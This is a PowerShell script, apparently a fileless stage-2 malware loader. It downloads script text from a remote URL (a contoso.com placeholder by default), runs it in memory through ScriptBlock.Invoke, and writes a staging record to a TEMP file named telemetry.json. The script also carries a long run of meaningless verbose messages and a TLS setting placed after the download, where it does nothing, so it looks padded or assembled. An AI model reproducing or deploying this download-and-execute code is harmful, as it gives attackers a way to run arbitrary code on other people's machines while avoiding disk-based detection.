[CmdletBinding()]
param(
    [string]$TransferUrl = 'https://contoso.com:443/stage2.ps1',
    [string]$LogPath = "$env:TEMP\telemetry.json",
    [int]$RequestTimeout = 72
)
$ErrorActionPreference = "Stop"

function Get-StageScriptText {
    param(
        [string]$SourceUrl = '',
        [int]$TimeoutSec = 72
    )

    Write-Verbose ("Fetching script text from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    return $ClientObject.DownloadString($SourceUrl)
}

function Invoke-Stage2Script {
    [CmdletBinding()]
    param(
        [string]$ScriptBody = ''
    )

    if ([string]::IsNullOrWhiteSpace($ScriptBody)) {
        throw "Stage 2 script body is empty"
    }
    Write-Verbose ("Script length: " + $ScriptBody.Length)
    $ScriptBlock = [ScriptBlock]::Create($ScriptBody)
    return $ScriptBlock.Invoke()
}

try {
    Write-Verbose "Starting in-memory stage"
    $PayloadText = Get-StageScriptText -SourceUrl $TransferUrl -TimeoutSec $RequestTimeout
    $TransferResult = Invoke-Stage2Script -ScriptBody $PayloadText
    Write-Verbose "Stage result: $($TransferResult)"
}
catch {
    Write-Warning "In-memory loader failed: $($_.Exception.Message)"
}

$LoadReport = [ordered]@{
    Stage = "memory"
    Endpoint = $TransferUrl
    ScriptLength = $PayloadText.Length
}
$LoadReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $LogPath -Append
Write-Verbose "Collecting host metadata"
Write-Verbose "Preparing working directory"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Applying operation timeout"
Write-Verbose "Stage handoff finished"
Write-Verbose "Checking local path"
Write-Verbose "Operation completed"
Write-Verbose "Inspecting process list"
Write-Verbose "Starting workflow"
Write-Verbose "Validating result"
Write-Verbose "Writing diagnostic marker"
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
